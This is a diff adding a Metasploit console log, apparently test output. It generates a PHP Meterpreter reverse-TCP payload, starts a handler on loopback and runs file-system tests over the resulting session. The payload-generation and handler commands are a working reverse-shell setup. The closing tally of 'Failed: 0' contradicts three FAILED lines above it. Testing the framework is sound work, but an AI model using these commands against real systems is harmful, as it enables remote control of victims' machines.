@@ -1,0 +1,56 @@
+use php/meterpreter_reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-6905-ohitnh.php -f raw lport=6016 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> [*] Writing 34276 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/meterpreter-spec-rb-php-meterpreter-reverse-tcp20220128-6905-ohitnh.php...
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 15
+[4mmsf6[0m payload([1m[31mphp/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6016 
+[*] Meterpreter session 16 opened (127.0.0.1:6016 -> 127.0.0.1:49378 ) at 2022-01-28 21:10:12 +0000
+use test/file
+[4mmsf6[0m post([1m[31mtest/file[0m) [0m> run session=16 addentropy=true verbose=true
+[*] Setup: changing working directory to /tmp
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: osx
+[!]  * missing Meterpreter features: stdapi_railgun_api
+[*] Running against session 16
+[*] Session type is meterpreter and platform is osx
+[*] Writing 31264 bytes
+[*] Finished in 0.014089
+[+] should write binary data
+[*] Read 31264 bytes
+[+] should read the binary data we just wrote
+[+] should delete binary files
+[+] should append binary data
+[+] should expand home
+[+] should not expand non-isolated tilde
+[+] should not expand mid-string tilde
+[+] should not expand env vars with invalid naming
+[+] should expand multiple variables
+[+] should test for file existence
+[+] should create text files
+[+] should read the text we just wrote
+[+] should append text files
+[+] should delete text files
+[+] should move files
+[+] should test for directory existence
+[*] Creating directory test-dir
+[*] test-dir created
+[*] Creating directory test-dir/directory
+[*] test-dir/directory created
+[+] should create directories
+[+] should list the directory we just made
+[-] FAILED: should recursively delete the directory we just made
+[-] Exception: Rex::Post::Meterpreter::RequestError : stdapi_fs_delete_dir: Operation failed: 1
+[*] Creating directory test-dir
+[-] FAILED: should delete a symbolic link target
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Creating directory test-dir.1
+[-] FAILED: should not recurse into symbolic link directories
+[-] Exception: Rex::TimeoutError : Operation timed out.
+[*] Testing complete in 0.528019
+[*] Passed: 21; Failed: 0
+[*] Cleanup: changing working directory back to /Users/runner/work/metasploit-framework/metasploit-framework
+[-] Post interrupted by the console user
+[*] Post module execution completed
